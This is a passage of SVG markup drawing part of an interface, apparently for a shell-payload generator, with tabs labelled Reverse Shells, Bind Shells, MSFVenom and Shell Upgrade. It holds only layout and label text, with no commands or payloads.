  <text x="373" y="205" text-anchor="middle" font-size="9" fill="#ccdd00">▶ obfuscatable</text>

  <!-- Tabs -->
  <!-- Active tab -->
  <rect x="12" y="220" width="112" height="24" rx="4 4 0 0" fill="#0d1a0d" stroke="#1a5a1a" stroke-width="1"/>
  <text x="68" y="236" text-anchor="middle" font-size="9" fill="#00ff00" letter-spacing="0.5">► Reverse Shells</text>

  <rect x="126" y="223" width="90" height="21" rx="4 4 0 0" fill="#0d0d0d" stroke="#1a3a1a" stroke-width="1"/>
  <text x="171" y="237" text-anchor="middle" font-size="9" fill="#555">► Bind Shells</text>

  <rect x="218" y="223" width="82" height="21" rx="4 4 0 0" fill="#0d0d0d" stroke="#1a3a1a" stroke-width="1"/>
  <text x="259" y="237" text-anchor="middle" font-size="9" fill="#555">► MSFVenom</text>

  <rect x="302" y="223" width="90" height="21" rx="4 4 0 0" fill="#0d0d0d" stroke="#1a3a1a" stroke-width="1"/>
  <text x="347" y="237" text-anchor="middle" font-size="9" fill="#555">► Shell Upgrade</text>

  <rect x="394" y="223" width="106" height="21" rx="4 4 0 0" fill="#0d0d0d" stroke="#1a3a1a" stroke-width="1"/>
